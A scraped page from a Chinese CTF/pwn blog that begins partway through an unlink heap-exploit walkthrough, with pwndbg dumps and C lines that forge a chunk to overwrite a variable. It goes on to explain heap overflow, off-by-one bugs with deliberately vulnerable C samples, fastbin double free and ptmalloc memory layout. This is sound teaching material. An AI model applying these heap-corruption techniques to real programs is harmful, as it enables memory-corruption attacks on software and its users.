<p>所以这个指向的”结构体”是这样的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x00007fffffffdd48</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>:	<span class="number">0x00007ffff7ffe1c8</span>-&gt;prev_size	<span class="number">0x0000000000000003</span>-&gt;size</span><br><span class="line"><span class="number">0x7fffffffdd58</span>:	<span class="number">0x00000000004006f3</span>-&gt;fd	<span class="number">0x0000000000602010</span>-&gt;bk</span><br><span class="line"></span><br><span class="line"><span class="number">0x7fffffffdd68</span>:	<span class="number">0x00000000006020a0</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>:	<span class="number">0x000000000040084d</span>	<span class="number">0x00007fffffffddb0</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000400800</span></span><br></pre></td></tr></table></figure></p>
<p>所以fake_chunk-&gt;fd-&gt;bk=0x0000000000602010=chunk1<br>而我们知道fake_chunk=chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p>
<p><strong>所以这样就过了chunk-&gt;fd-&gt;bk==chunk的检查</strong><br><strong>chunk-&gt;bk-&gt;fd == chunk也是同理的</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-144600.png" alt=""></p>
<h3 id="通过检查点2"><a href="#通过检查点2" class="headerlink" title="通过检查点2"></a>通过检查点2</h3><p>然后为了通过检查点<code>chunk size是否等于next chunk(内存意义上的)的prev_size</code>,我们需要修改chunk2的prev_size<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602090</span></span><br><span class="line"><span class="number">0x602090</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6020a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<h3 id="触发unlink"><a href="#触发unlink" class="headerlink" title="触发unlink"></a>触发unlink</h3><p>当我们free(chunk2)的时候，因为prev_in_use位被置0，代表前一个chunk（也就是我们的fake_chunk)也处于free，连续的空闲堆块合并而进行unlink操作。<br>也就是设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p>
<p>可以看出fake_chunk-&gt;fd-&gt;bk和fake_chunk-&gt;bk-&gt;fd都指向(或者说等于)chunk1,即0x0000000000602010，所以只需要关注第二次操作即可。</p>
<p>P-&gt;fd即fake_chunk-&gt;fd=0x00007fffffffdd48<br>所以unlink之后,P-&gt;bk-&gt;fd由0x602010变为0x00007fffffffdd48<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p>
<p>变为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x7fffffffdd48</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p>
<p>也就是说现在chunk1的值变成了0x7fffffffdd48，chunk1[3]实际上就是chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">45</span>	  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line"><span class="number">46</span>	  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; b <span class="number">47</span></span><br><span class="line">Breakpoint <span class="number">3</span> at <span class="number">0x400788</span>: file unlink.c, line <span class="number">47.</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">0x7fffffffdd48</span></span><br><span class="line">ffffdd48</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-155409.png" alt=""></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>改变chunk1[3]就是改变chunk1,在本例中, chunk1用于指向变量data并且通过改变chunk1从而影响到了该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[3] = (unsigned long long)data;</span><br></pre></td></tr></table></figure></p>
<p>可以看出现在chunk1的值已经变成了data的地址0x7fffffffdd80<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rdx rsp  0x7fffffffdd60 —▸ 0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br></pre></td></tr></table></figure></p>
<p>改变data的值为Victim’s data<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br></pre></td></tr></table></figure></p>
<p>在内存中查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:	&quot;Victim&apos;s data&quot;</span><br></pre></td></tr></table></figure></p>
<p>现在的chunk1已经指向data了，通过给chunk1[0]赋值，其实就是给data赋值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[0] = 0x002164656b636168LL;</span><br></pre></td></tr></table></figure></p>
<p>查看内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:	&quot;hacked!&quot;</span><br></pre></td></tr></table></figure></p>
<p>果然已经变了。<br>字符串已经变成了hacked!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">hacked!</span><br></pre></td></tr></table></figure></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/28/heap_exp1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/28/heap_exp1/" itemprop="url">堆漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T10:15:13+08:00">
                2018-02-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/堆利用/" itemprop="url" rel="index">
                    <span itemprop="name">堆利用</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p>
<p>堆溢出漏洞发生的基本前提是</p>
<ul>
<li>程序向堆上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p>
<ul>
<li>覆盖与其物理相邻的下一个 chunk 的元数据。</li>
<li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li>
</ul>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>堆溢出中比较重要的几个步骤:</p>
<h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">//等同于</span><br><span class="line">ptr=malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure></p>
<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk,*chunk1;</span><br><span class="line">  chunk=malloc(16);</span><br><span class="line">  chunk1=realloc(chunk,32);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p>
<ul>
<li>当realloc(ptr,size)的size不等于ptr的size时<ul>
<li>如果申请size&gt;原来size<ul>
<li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li>
<li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size)</li>
</ul>
</li>
<li>如果申请size&lt;原来size<ul>
<li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li>
<li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>当realloc(ptr,size)的size等于0时，相当于free(ptr)</li>
<li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li>
</ul>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。<br>常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略 ‘\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li>
<li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h2 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h2><h3 id="off-by-one-漏洞原理"><a href="#off-by-one-漏洞原理" class="headerlink" title="off-by-one 漏洞原理"></a>off-by-one 漏洞原理</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误(这在 C 语言初学者中很常见)导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>例如</p>
<ul>
<li>循环<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input:"</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>off-by-one after<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2 </span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<ul>
<li>字符串<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>strlen 和 strcpy 的行为不一致却导致了off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 ‘\x00’ 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 ‘\x00’ 。这就导致了我们向chunk1中写入了25个字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure></p>
<p>off-by-one after<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure></p>
<p>可以看到 next chunk 的 size 域低字节被结束符 ‘\x00’ 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的CPU的字节序都是小端法的，比如一个DWORD值在使用小端法的内存中是这样储存的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure></p>
<p>举一个例子，比如数字0x12 34 56 78在内存中的表示形式为：<br>1)大端模式：</p>
<p>低地址 —————–&gt; 高地址<br>0x12  |  0x34  |  0x56  |  0x78<br>2)小端模式：</p>
<p>低地址 ——————&gt; 高地址<br>0x78  |  0x56  |  0x34  |  0x12</p>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>内容有点多，单独写了一篇文章。<br><a href="http://eternalsakura13.com/2018/03/01/unlink1/">http://eternalsakura13.com/2018/03/01/unlink1/</a></p>
<h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<ul>
<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
<li>漏洞发生于 fastbin 类型的 chunk 中<br>如果细分的话，可以做如下的分类：</li>
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<p>其中，前两种主要漏洞侧重于利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击，后两种侧重于故意修改fd指针，直接利用malloc 申请指定位置chunk进行攻击。</p>
<h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ul>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/27/heap1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/heap1/" itemprop="url">ptmalloc</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-27T16:34:49+08:00">
                2018-02-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/堆利用/" itemprop="url" rel="index">
                    <span itemprop="name">堆利用</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>CTF pwn的环境主要是linux，一般用到的是堆内存管理机制叫做ptmalloc。<br>因为很久没有做过相关赛题了，已经忘了很多，于是准备把ptmalloc再整理一下。</p>
<h2 id="Linux进程地址空间"><a href="#Linux进程地址空间" class="headerlink" title="Linux进程地址空间"></a>Linux进程地址空间</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-085355.jpg" alt=""><br>这种布局是 Linux 内核 2.6.7 以前的默认进程内存布局形式，mmap 区域与栈区域相对增 长，这意味着堆只有 1GB 的虚拟地址空间可以使用，继续增长就会进入 mmap 映射区域。<br>0x4000,0000—-&gt;2^30—–&gt;1G</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-085423.jpg" alt=""><br>栈至顶向下扩展，并且栈是有界的。堆至底向上扩展，mmap 映射区域至顶向下扩展，mmap映射区域和堆相对扩展，直至耗尽虚拟地址空间中的剩余区域，这种结构便于c运行时库使用 mmap 映射区域和堆进行内存分配。上图的布局形式是在内核 2.6.7 以后才引入的，这是 32 位模式下进程的默认内存布局形式。 </p>
<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-090021.jpg" alt=""></p>
